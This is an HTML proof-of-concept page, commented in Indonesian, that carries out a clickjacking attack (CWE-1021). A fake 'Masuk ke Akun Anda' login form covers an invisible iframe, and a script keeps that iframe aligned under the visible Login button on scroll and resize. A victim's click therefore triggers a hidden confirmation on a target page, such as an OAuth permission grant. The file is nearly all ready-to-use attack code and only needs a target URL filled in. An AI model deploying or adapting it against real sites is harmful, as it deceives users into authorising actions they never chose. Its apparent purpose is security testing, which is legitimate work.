<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Halaman Login — Pusat Layanan</title>
<style>
  body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; }
  .wrap { max-width: 360px; margin: 60px auto; background: #fff; padding: 24px;
          border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.15); }
  h1 { font-size: 18px; text-align: center; }
  input[type=text], input[type=password] {
    width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc;
    border-radius: 4px; box-sizing: border-box;
  }
  .btn {
    width: 100%; padding: 10px; margin-top: 8px; background: #1a73e8;
    color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;
  }
  /* ===== Teknik spoofing CWE-1021 =====
     1) Layer iframe transparan diposisikan di atas tombol.
     2) Konten iframe digeser (negative offset) agar tombol "Ya, beri izin"
        pada halaman target persis menutupi tombol "Login" yang terlihat.
     3) opacity 0 → aksi korban diarahkan ke aksi tersembunyi. */
  .overlay {
    position: absolute; opacity: 0.0;   /* ubah ke 0.1 untuk debug visual */
    width: 300px; height: 220px; border: none; z-index: 10;
  }
  #hiddenFrame { top: 158px; left: calc(50% - 150px); }
</style>
</head>
<body>
<div class="wrap" style="position: relative;">
  <h1>🔐 Masuk ke Akun Anda</h1>
  <input type="text" placeholder="Email" autocomplete="off">
  <input type="password" placeholder="Kata sandi" autocomplete="off">

  <!-- Tombol yang TERLIHAT oleh korban -->
  <button class="btn" tabindex="-1">Login</button>

  <!-- Layer tersembunyi: halaman target berisi aksi berbahaya.
       Ganti TARGET_URL dengan halaman konfirmasi pada aset yang diuji,
       mis. https://target-anda.test/settings/oauth-grant.html
       Sesuaikan offset top/left agar tombol konfirmasi target
       sejajar persis di atas tombol "Login". -->
  <iframe id="hiddenFrame" class="overlay"
          src="TARGET_URL"
          sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
</div>

<script>
  // Dinamis: pasang offset klik terhadap tombol terlihat (scroll-safe)
  const btn   = document.querySelector('.btn');
  const frame = document.getElementById('hiddenFrame');
  function align() {
    const r = btn.getBoundingClientRect();
    frame.style.top    = (r.top + window.scrollY + r.height/2 - 110) + 'px';
    frame.style.left   = (r.left + r.width/2  - 150) + 'px';
  }
  align();
  window.addEventListener('resize', align);
  window.addEventListener('scroll', align);

  // Tandai saat aksi korban tertangkap layer (untuk log pengujian)
  frame.addEventListener('load', () => {
    try { frame.contentWindow.addEventListener('click',
      e => console.log('[POC] Klik korban diarahkan ke target:', e.clientX, e.clientY));
    } catch (err) { /* cross-origin: cek log di sisi target */ }
  });
</script>
</body>
</html>
